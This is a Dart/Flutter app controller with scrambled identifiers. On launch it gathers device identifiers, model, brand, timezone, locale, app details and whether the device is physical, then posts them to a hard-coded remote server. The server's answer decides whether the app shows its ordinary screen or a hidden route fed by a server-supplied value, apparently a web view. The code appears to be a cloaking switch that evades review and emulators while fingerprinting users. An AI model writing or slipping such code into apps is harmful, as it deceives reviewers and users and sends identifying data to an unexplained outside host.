import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var tproxndvyf = RxBool(false);
  var fxzcnhrqlu = RxBool(true);
  var ygev = RxString("");
  var amani = RxBool(false);
  var beahan = RxBool(true);
  final dcwshpigan = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    moyqs();
  }


  Future<void> moyqs() async {

    amani.value = true;
    beahan.value = true;
    fxzcnhrqlu.value = false;

    dcwshpigan.post("https://ocen.gdfyt02.online/KPLHGGTEZDVIUE",data: await wbpiuzxlf()).then((value) {
      var gtmbwq = value.data["gtmbwq"] as String;
      var uryw = value.data["uryw"] as bool;
      if (uryw) {
        ygev.value = gtmbwq;
        esther();
      } else {
        schaden();
      }
    }).catchError((e) {
      fxzcnhrqlu.value = true;
      beahan.value = true;
      amani.value = false;
    });
  }

  Future<Map<String, dynamic>> wbpiuzxlf() async {
    final DeviceInfoPlugin pceqxtf = DeviceInfoPlugin();
    PackageInfo buvydnfa_aiswpre = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ytivno = Platform.localeName;
    var xtqfr = currentTimeZone;

    var xpmz = buvydnfa_aiswpre.packageName;
    var ibjx = buvydnfa_aiswpre.version;
    var txcogeni = buvydnfa_aiswpre.buildNumber;

    var nhzx = buvydnfa_aiswpre.appName;
    var laneyJohnson = "";
    var symvt = "";
    var hancley = "";
    var clintonBarrows = "";
    var ekxi  = "";
    var kurtFay = "";
    var florianSchaefer = "";


    var aqdhxlr = "";
    var eyqcrxib = false;

    if (GetPlatform.isAndroid) {
      aqdhxlr = "android";
      var lwhxoutzg = await pceqxtf.androidInfo;

      hancley = lwhxoutzg.brand;

      symvt  = lwhxoutzg.model;
      ekxi = lwhxoutzg.id;

      eyqcrxib = lwhxoutzg.isPhysicalDevice;
    }
    if (GetPlatform.isIOS) {
      aqdhxlr = "ios";
      var giblvcj = await pceqxtf.iosInfo;
      hancley = giblvcj.name;
      symvt = giblvcj.model;

      ekxi = giblvcj.identifierForVendor ?? "";
      eyqcrxib  = giblvcj.isPhysicalDevice;
    }
    var res = {
      "florianSchaefer" : florianSchaefer,
      "nhzx": nhzx,
      "xpmz": xpmz,
      "ibjx": ibjx,
      "symvt": symvt,
      "xtqfr": xtqfr,
      "hancley": hancley,
      "ekxi": ekxi,
      "ytivno": ytivno,
      "laneyJohnson" : laneyJohnson,
      "aqdhxlr": aqdhxlr,
      "txcogeni": txcogeni,
      "eyqcrxib": eyqcrxib,
      "clintonBarrows" : clintonBarrows,
      "kurtFay" : kurtFay,

    };
    return res;
  }

  Future<void> schaden() async {
    Get.offAllNamed("/work_tab");
  }

  Future<void> esther() async {
    Get.offAllNamed("/acs");
  }
}
